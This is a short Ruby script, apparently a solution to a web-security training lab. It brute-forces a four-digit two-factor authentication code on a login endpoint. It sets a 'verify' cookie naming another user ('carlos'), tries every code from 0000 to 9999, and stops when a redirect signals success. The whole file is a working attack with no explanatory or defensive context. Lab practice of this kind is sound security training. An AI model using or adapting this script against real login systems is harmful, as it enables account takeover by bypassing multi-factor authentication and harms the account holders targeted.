require 'http'
require 'nokogiri'

url='https://0a0800710496ca0780e8261f00ec0071.web-security-academy.net/login2'

temp_arr = (0000..9999).to_a
wl = []

temp_arr.each {|d| wl << "%04d" % d}


client = HTTP.cookies(
	:Session=>"IO4Um3WqF3pv6Ma52ygABkE8ZvyZ2LnE",
	:verify=>"carlos"
)

# Generate MFA Code
gen_code = client.get(url)

#Bruteforce generated code
wl.each do |comb|
	get_code = client.post(url,:form=>
		{
			:"mfa-code"=>"#{comb}"
		})
	resp = Nokogiri.parse get_code.body.to_s
	resph = resp.search(:css,'p.is-warning').text
	puts "#{comb} : #{resph}"
	if get_code.status==302
		puts "Authenticated #{comb}"
		break
	end
end
